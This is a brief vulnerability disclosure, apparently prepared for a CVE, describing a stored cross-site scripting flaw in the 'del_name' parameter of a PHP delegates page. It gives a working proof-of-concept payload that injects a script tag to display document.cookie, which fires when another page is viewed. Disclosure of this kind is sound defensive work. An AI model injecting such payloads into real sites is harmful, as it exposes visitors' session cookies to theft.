BUG_Author: zhangyf

Vulnerability File: /dipam/save-delegates.php

GET parameter "del_name" exists stored cross-site scripting vulnerability

Payload: /dipam/save-delegates.php?del_name=<script>alert(document.cookie)</script>&del_color=%23000000

![image](https://github.com/M9KJ-TEAM/CVEReport/blob/main/5.png)

Payload will trigger when a user visits on http://localhost/dipam/all-delegates.php.

![image](https://github.com/M9KJ-TEAM/CVEReport/blob/main/6.png)
